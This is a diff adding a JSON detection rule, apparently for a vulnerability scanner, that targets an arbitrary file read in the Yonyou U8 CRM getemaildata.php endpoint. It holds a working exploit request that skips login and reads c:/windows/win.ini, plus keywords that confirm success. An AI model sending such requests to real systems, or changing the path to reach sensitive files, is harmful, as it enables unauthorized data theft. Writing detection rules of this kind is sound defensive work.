@@ -1,0 +1,24 @@
+{
+    "vul_name": "用友 U8 CRM客户关系管理系统 getemaildata.php 存在任意文件读取漏洞",
+    "level": "中危",
+    "description": "用友 U8 CRM客户关系管理系统 getemaildata.php 存在任意文件读取漏洞，攻击者通过漏洞可以获取到服务器中的敏感文件\r\n",
+    "product": "用友 U8 CRM客户关系管理系统",
+    "version": "用友 U8 CRM客户关系管理系统 ",
+    "cve": "无",
+    "reference": "https://peiqi.wgpsec.org/wiki/oa/%E7%94%A8%E5%8F%8BOA/%E7%94%A8%E5%8F%8B%20U8%20CRM%E5%AE%A2%E6%88%B7%E5%85%B3%E7%B3%BB%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20getemaildata.php%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.html",
+    "fixing": "联系厂商打补丁",
+    "rule": {
+        "path": "/ajax/getemaildata.php?DontCheckLogin=1&filePath=c:/windows/win.ini",
+        "method": "GET",
+        "headers": "",
+        "body": "",
+        "status_code": "200",
+        "keywords": "files;fonts",
+        "res_time": ""
+    },
+    "operator": {
+        "author": "浪飒",
+        "email": "langsa-hy@qq.com",
+        "github": "https://github.com/langsasec"
+    }
+}
